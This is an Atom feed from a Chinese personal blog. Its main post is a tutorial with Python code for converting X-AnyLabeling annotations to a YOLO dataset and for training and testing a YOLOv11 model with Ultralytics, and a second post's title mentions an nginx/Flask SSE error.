<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>夏尔の个人博客</title>
  
  <subtitle>分享个人经验见解</subtitle>
  <link href="https://reiner.host/atom.xml" rel="self"/>
  
  <link href="https://reiner.host/"/>
  <updated>2025-12-05T01:33:05.697Z</updated>
  <id>https://reiner.host/</id>
  
  <author>
    <name>reiner</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用X-AnyLabeling+Ultralytics标注数据训练YOLOV11模型</title>
    <link href="https://reiner.host/posts/2a81f883.html"/>
    <id>https://reiner.host/posts/2a81f883.html</id>
    <published>2025-12-05T01:31:53.000Z</published>
    <updated>2025-12-05T01:33:05.697Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="说明">说明</span></h3><p>此文章用于记录训练</p><h3><span id="安装x-anylabeling">安装X-Anylabeling</span></h3><p>git clone <a href="https://github.com/CVHub520/X-AnyLabeling">https://github.com/CVHub520/X-AnyLabeling</a> ,或者直接下载Releases版的EXE直接运行。</p><h3><span id="安装ultralytics">安装Ultralytics</span></h3><p><code>pip install -U ultralytics</code> </p><p>别忘了安装<strong>PyTorch</strong></p><p><img src="C:\Users\Shir\AppData\Roaming\marktext\images\2025-11-27-14-53-55-image.png"></p><h3><span id="使用x-anylabeling标注图片">使用X-AnyLabeling标注图片</span></h3><p>打开X-AnyLabeling并使用图形界面的标注工具，标注完毕后会针对每张图片生成对应的json数据。</p><p>接下来<strong>导出classes.txt</strong> ，步骤为点击工具-总览-导出，将导出后的压缩包解压可得classes.txt</p><h3><span id="使用代码将标注数据转换为yolov8-dataset数据集">使用代码将标注数据转换为yolov8 dataset数据集</span></h3><p>X-AnyLabeling标注的数据为Json格式，无法直接用于训练，运行以下代码将数据转换成训练数据集：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># convert_xanylabeling_to_yolo_final.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持的图片格式</span></span><br><span class="line">IMG_EXTENSIONS = &#123;<span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.tiff&#x27;</span>, <span class="string">&#x27;.webp&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_single_json</span>(<span class="params">json_path, img_dir, label_dir, name2id</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;转换单个JSON为YOLO txt格式&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(json_path, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = json.load(f)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取图片路径</span></span><br><span class="line">    img_name = data.get(<span class="string">&quot;imagePath&quot;</span>, json_path.stem + <span class="string">&quot;.jpg&quot;</span>)</span><br><span class="line">    img_path = img_dir / img_name</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果直接路径不存在，尝试查找同名不同扩展名的图片</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> img_path.exists():</span><br><span class="line">        <span class="comment"># 查找所有可能的图片格式</span></span><br><span class="line">        <span class="keyword">for</span> ext <span class="keyword">in</span> IMG_EXTENSIONS:</span><br><span class="line">            alt_path = img_dir / <span class="string">f&quot;<span class="subst">&#123;img_path.stem&#125;</span><span class="subst">&#123;ext&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> alt_path.exists():</span><br><span class="line">                img_path = alt_path</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> img_path.exists():</span><br><span class="line">        print(<span class="string">f&quot;⚠️ 图片不存在: <span class="subst">&#123;img_path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 转换标注</span></span><br><span class="line">    lines = []</span><br><span class="line">    <span class="keyword">for</span> shape <span class="keyword">in</span> data.get(<span class="string">&quot;shapes&quot;</span>, []):</span><br><span class="line">        <span class="keyword">if</span> shape[<span class="string">&quot;shape_type&quot;</span>] == <span class="string">&quot;rectangle&quot;</span>:</span><br><span class="line">            label = shape[<span class="string">&quot;label&quot;</span>]</span><br><span class="line">            <span class="keyword">if</span> label <span class="keyword">not</span> <span class="keyword">in</span> name2id:</span><br><span class="line">                print(<span class="string">f&quot;⚠️ 未知类别: <span class="subst">&#123;label&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            class_id = name2id[label]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 坐标转换 - 支持2点和4点格式</span></span><br><span class="line">            points = shape[<span class="string">&quot;points&quot;</span>]</span><br><span class="line">            img_w, img_h = data[<span class="string">&quot;imageWidth&quot;</span>], data[<span class="string">&quot;imageHeight&quot;</span>]</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(points) == <span class="number">2</span>:</span><br><span class="line">                <span class="comment"># 标准2点格式：左上角和右下角</span></span><br><span class="line">                x1, y1 = points[<span class="number">0</span>]</span><br><span class="line">                x2, y2 = points[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(points) == <span class="number">4</span>:</span><br><span class="line">                <span class="comment"># X-AnyLabeling的4点格式：4个角点</span></span><br><span class="line">                <span class="comment"># 提取所有x和y坐标</span></span><br><span class="line">                xs = [p[<span class="number">0</span>] <span class="keyword">for</span> p <span class="keyword">in</span> points]</span><br><span class="line">                ys = [p[<span class="number">1</span>] <span class="keyword">for</span> p <span class="keyword">in</span> points]</span><br><span class="line">                <span class="comment"># 找到边界框</span></span><br><span class="line">                x1, x2 = <span class="built_in">min</span>(xs), <span class="built_in">max</span>(xs)</span><br><span class="line">                y1, y2 = <span class="built_in">min</span>(ys), <span class="built_in">max</span>(ys)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">f&quot;⚠️ 坐标点数量异常: <span class="subst">&#123;<span class="built_in">len</span>(points)&#125;</span> (应该是2或4)&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 计算YOLO格式</span></span><br><span class="line">            x_center = ((x1 + x2) / <span class="number">2</span>) / img_w</span><br><span class="line">            y_center = ((y1 + y2) / <span class="number">2</span>) / img_h</span><br><span class="line">            width = <span class="built_in">abs</span>(x2 - x1) / img_w</span><br><span class="line">            height = <span class="built_in">abs</span>(y2 - y1) / img_h</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 验证标注有效性</span></span><br><span class="line">            <span class="keyword">if</span> width == <span class="number">0</span> <span class="keyword">or</span> height == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">f&quot;⚠️ 跳过无效标注 (宽度或高度为0): <span class="subst">&#123;label&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            lines.append(<span class="string">f&quot;<span class="subst">&#123;class_id&#125;</span> <span class="subst">&#123;x_center:<span class="number">.6</span>f&#125;</span> <span class="subst">&#123;y_center:<span class="number">.6</span>f&#125;</span> <span class="subst">&#123;width:<span class="number">.6</span>f&#125;</span> <span class="subst">&#123;height:<span class="number">.6</span>f&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 写入txt</span></span><br><span class="line">    txt_path = label_dir / <span class="string">f&quot;<span class="subst">&#123;img_path.stem&#125;</span>.txt&quot;</span></span><br><span class="line">    txt_path.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    txt_path.write_text(<span class="string">&quot;\n&quot;</span>.join(lines))</span><br><span class="line">    <span class="keyword">return</span> img_path, txt_path</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">json_dir, img_dir, output_dir, class_file, split=<span class="number">0.2</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;主流程：转换+划分+生成data.yaml&quot;&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    print(<span class="string">&quot;开始转换X-AnyLabeling标注&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取类别</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(class_file, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line">    </span><br><span class="line">    id2name = &#123;i: name <span class="keyword">for</span> i, name <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines)&#125;</span><br><span class="line">    name2id = &#123;name: i <span class="keyword">for</span> i, name <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines)&#125;</span><br><span class="line">    print(<span class="string">f&quot;✅ 加载类别: <span class="subst">&#123;name2id&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查输入目录</span></span><br><span class="line">    json_path = Path(json_dir)</span><br><span class="line">    img_path = Path(img_dir)</span><br><span class="line">    print(<span class="string">f&quot;\nJSON目录: <span class="subst">&#123;json_path&#125;</span> | 存在: <span class="subst">&#123;json_path.exists()&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">f&quot;图片目录: <span class="subst">&#123;img_path&#125;</span> | 存在: <span class="subst">&#123;img_path.exists()&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    json_files = <span class="built_in">list</span>(json_path.glob(<span class="string">&quot;*.json&quot;</span>))</span><br><span class="line">    print(<span class="string">f&quot;\n找到JSON文件数: <span class="subst">&#123;<span class="built_in">len</span>(json_files)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(json_files) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&quot;❌ 错误：未找到任何JSON文件！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查图片文件（支持多种格式）</span></span><br><span class="line">    img_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> img_path.glob(<span class="string">&quot;*.*&quot;</span>) <span class="keyword">if</span> f.suffix.lower() <span class="keyword">in</span> IMG_EXTENSIONS]</span><br><span class="line">    print(<span class="string">f&quot;找到图片文件数: <span class="subst">&#123;<span class="built_in">len</span>(img_files)&#125;</span> | 格式: <span class="subst">&#123;<span class="built_in">set</span>(f.suffix <span class="keyword">for</span> f <span class="keyword">in</span> img_files)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(img_files) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&quot;❌ 错误：未找到任何图片文件！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建目录</span></span><br><span class="line">    output = Path(output_dir)</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [<span class="string">&quot;images/train&quot;</span>, <span class="string">&quot;images/val&quot;</span>, <span class="string">&quot;labels/train&quot;</span>, <span class="string">&quot;labels/val&quot;</span>]:</span><br><span class="line">        (output / d).mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    print(<span class="string">f&quot;\n✅ 输出目录创建完成: <span class="subst">&#123;output&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 转换所有JSON到临时目录</span></span><br><span class="line">    temp_label_dir = output / <span class="string">&quot;labels_temp&quot;</span></span><br><span class="line">    temp_label_dir.mkdir(exist_ok=<span class="literal">True</span>)</span><br><span class="line">    img_paths, label_paths = [], []</span><br><span class="line">    <span class="keyword">for</span> json_file <span class="keyword">in</span> json_files:</span><br><span class="line">        result = convert_single_json(json_file, img_path, temp_label_dir, name2id)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            img_paths.append(result[<span class="number">0</span>])</span><br><span class="line">            label_paths.append(result[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">f&quot;\n转换成功总数: <span class="subst">&#123;<span class="built_in">len</span>(img_paths)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(img_paths) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&quot;❌ 致命错误：未成功转换任何数据！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 拷贝图片到临时目录（保留原始扩展名）</span></span><br><span class="line">    temp_img_dir = output / <span class="string">&quot;images_temp&quot;</span></span><br><span class="line">    temp_img_dir.mkdir(exist_ok=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> img_paths:</span><br><span class="line">        shutil.copy(img, temp_img_dir)</span><br><span class="line">    print(<span class="string">f&quot;✅ 图片已拷贝到临时目录: <span class="subst">&#123;<span class="built_in">len</span>(<span class="built_in">list</span>(temp_img_dir.glob(<span class="string">&#x27;*&#x27;</span>)))&#125;</span>张&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 划分train/val</span></span><br><span class="line">    all_imgs = [f <span class="keyword">for</span> f <span class="keyword">in</span> temp_img_dir.glob(<span class="string">&quot;*.*&quot;</span>) <span class="keyword">if</span> f.suffix.lower() <span class="keyword">in</span> IMG_EXTENSIONS]</span><br><span class="line">    print(<span class="string">f&quot;待划分图片数: <span class="subst">&#123;<span class="built_in">len</span>(all_imgs)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(all_imgs) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&quot;❌ 错误：至少需要2张图片才能划分train/val&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    train_imgs, val_imgs = train_test_split(all_imgs, test_size=split, random_state=<span class="number">42</span>)</span><br><span class="line">    print(<span class="string">f&quot;划分结果: 训练集<span class="subst">&#123;<span class="built_in">len</span>(train_imgs)&#125;</span>张, 验证集<span class="subst">&#123;<span class="built_in">len</span>(val_imgs)&#125;</span>张&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 移动文件到最终位置（同时移动对应的标签文件）</span></span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> train_imgs:</span><br><span class="line">        shutil.move(<span class="built_in">str</span>(img), output / <span class="string">&quot;images/train&quot;</span>)</span><br><span class="line">        <span class="comment"># 移动对应的标签文件</span></span><br><span class="line">        label_file = temp_label_dir / <span class="string">f&quot;<span class="subst">&#123;img.stem&#125;</span>.txt&quot;</span></span><br><span class="line">        <span class="keyword">if</span> label_file.exists():</span><br><span class="line">            shutil.move(<span class="built_in">str</span>(label_file), output / <span class="string">&quot;labels/train&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> val_imgs:</span><br><span class="line">        shutil.move(<span class="built_in">str</span>(img), output / <span class="string">&quot;images/val&quot;</span>)</span><br><span class="line">        <span class="comment"># 移动对应的标签文件</span></span><br><span class="line">        label_file = temp_label_dir / <span class="string">f&quot;<span class="subst">&#123;img.stem&#125;</span>.txt&quot;</span></span><br><span class="line">        <span class="keyword">if</span> label_file.exists():</span><br><span class="line">            shutil.move(<span class="built_in">str</span>(label_file), output / <span class="string">&quot;labels/val&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 清理临时目录</span></span><br><span class="line">    temp_img_dir.rmdir()</span><br><span class="line">    <span class="keyword">if</span> temp_label_dir.exists():</span><br><span class="line">        <span class="comment"># 检查是否还有剩余文件</span></span><br><span class="line">        remaining = <span class="built_in">list</span>(temp_label_dir.glob(<span class="string">&quot;*&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> remaining:</span><br><span class="line">            print(<span class="string">f&quot;⚠️ 警告：临时标签目录中还有<span class="subst">&#123;<span class="built_in">len</span>(remaining)&#125;</span>个文件未处理&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp_label_dir.rmdir()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 生成data.yaml（使用列表格式避免ASCII码问题）</span></span><br><span class="line">    yaml_content = &#123;</span><br><span class="line">        <span class="string">&quot;path&quot;</span>: <span class="built_in">str</span>(output.absolute()),</span><br><span class="line">        <span class="string">&quot;train&quot;</span>: <span class="string">&quot;images/train&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>: <span class="string">&quot;images/val&quot;</span>,</span><br><span class="line">        <span class="string">&quot;nc&quot;</span>: <span class="built_in">len</span>(id2name),</span><br><span class="line">        <span class="string">&quot;names&quot;</span>: [id2name[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(id2name))]</span><br><span class="line">    &#125;</span><br><span class="line">    (output / <span class="string">&quot;data.yaml&quot;</span>).write_text(yaml.dump(yaml_content, sort_keys=<span class="literal">False</span>, allow_unicode=<span class="literal">True</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line">    print(<span class="string">&quot;✅ 转换完成！&quot;</span>)</span><br><span class="line">    print(<span class="string">f&quot;训练集: <span class="subst">&#123;<span class="built_in">len</span>(train_imgs)&#125;</span>张&quot;</span>)</span><br><span class="line">    print(<span class="string">f&quot;验证集: <span class="subst">&#123;<span class="built_in">len</span>(val_imgs)&#125;</span>张&quot;</span>)</span><br><span class="line">    print(<span class="string">f&quot;配置文件: <span class="subst">&#123;output / <span class="string">&#x27;data.yaml&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;=&quot;</span> * <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例（请替换成你的真实路径）</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(</span><br><span class="line">        json_dir=<span class="string">&quot;D:/Develop/yolo/tran_data&quot;</span>,</span><br><span class="line">        img_dir=<span class="string">&quot;D:/Develop/yolo/tran_data&quot;</span>,</span><br><span class="line">        output_dir=<span class="string">&quot;D:/Develop/yolo/tran_data/dataset_complete&quot;</span>, <span class="comment">#转换输出路径</span></span><br><span class="line">        class_file=<span class="string">&quot;D:/Develop/yolo/tran_data/classes.txt&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>执行完会生成daya.yml 文件和images lables文件夹</p><h3><span id="使用ultralytics训练yolov11模型">使用Ultralytics训练yolov11模型</span></h3><p>首先需要前往官网下载yolo11n或者其它版本的模型，也可以<strong>直接在X-AnyLabeling</strong>中下载，具体操作为点击左侧的’AI’按钮，再点击选择模型，点击yolov11模型会自动开始下载。</p><p>运行以下代码开始训练模型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> ultralytics <span class="keyword">import</span> YOLO</span><br><span class="line"></span><br><span class="line">model = YOLO(<span class="string">&#x27;yolo11n.pt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">model.train(</span><br><span class="line">    data=<span class="string">&#x27;D:\\Develop\\yolo\\tran_data\\dataset_complete\\data.yaml&#x27;</span>,</span><br><span class="line">    epochs=<span class="number">300</span>,  <span class="comment"># 增加epochs</span></span><br><span class="line">    patience=<span class="number">50</span>,  <span class="comment"># 增加耐心值</span></span><br><span class="line">    batch=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>训练完成后会在控制台打印训练完成后的新模型路径，将会生成best.pt和last.pt</p><h3><span id="测试新训练的模型">测试新训练的模型</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ultralytics <span class="keyword">import</span> YOLO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model = YOLO(<span class="string">r&quot;D:\\Develop\\detect\\train3\weights\\best.pt&quot;</span>)</span><br><span class="line"><span class="comment"># Run inference on an image</span></span><br><span class="line">results = model(<span class="string">r&quot;D://test.png&quot;</span>)  <span class="comment"># Replace with your image path</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Process results list</span></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">    boxes = result.boxes  <span class="comment"># Boxes object for bbox outputs</span></span><br><span class="line">    masks = result.masks  <span class="comment"># Masks object for segmentation masks outputs</span></span><br><span class="line">    keypoints = result.keypoints  <span class="comment"># Keypoints object for pose outputs</span></span><br><span class="line">    probs = result.probs  <span class="comment"># Probs object for classification outputs</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Show the results</span></span><br><span class="line">    result.show()  <span class="comment"># display to screen</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Print detected classes</span></span><br><span class="line">    <span class="keyword">for</span> box <span class="keyword">in</span> boxes:</span><br><span class="line">        class_id = <span class="built_in">int</span>(box.cls[<span class="number">0</span>])</span><br><span class="line">        class_name = result.names[class_id]</span><br><span class="line">        conf = <span class="built_in">float</span>(box.conf[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">f&quot;Detected: <span class="subst">&#123;class_name&#125;</span> with confidence: <span class="subst">&#123;conf:<span class="number">.2</span>f&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Save results to disk</span></span><br><span class="line">    result.save(filename=<span class="string">&#x27;result.jpg&#x27;</span>)  <span class="comment"># save to disk</span></span><br></pre></td></tr></table></figure><p>运行以上代码来测试是否能正常识别训练的物体。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;说明&quot;&gt;说明&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;此文章用于记录训练&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;安装x-anylabeling&quot;&gt;安装X-Anylabeling&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;git clone &lt;a href=&quot;https://git</summary>
      
    
    
    
    <category term="AI" scheme="https://reiner.host/categories/AI/"/>
    
    
    <category term="AI" scheme="https://reiner.host/tags/AI/"/>
    
    <category term="YOLO" scheme="https://reiner.host/tags/YOLO/"/>
    
    <category term="Ultralytics" scheme="https://reiner.host/tags/Ultralytics/"/>
    
    <category term="X-AnyLabeling" scheme="https://reiner.host/tags/X-AnyLabeling/"/>
    
  </entry>
  
  <entry>
    <title>使用nginx+flask调用SSE流式输出接口报net::ERR_HTTP2_PROTOCOL_ERROR</title>
    <link href="https://reiner.host/posts/dfb03ccc.html"/>
    <id>https://reiner.host/posts/dfb03ccc.html</id>
    <published>2025-06-13T06:43:30.000Z</published>
    <updated>2025-06-13T06:49:44.926Z</updated>
    
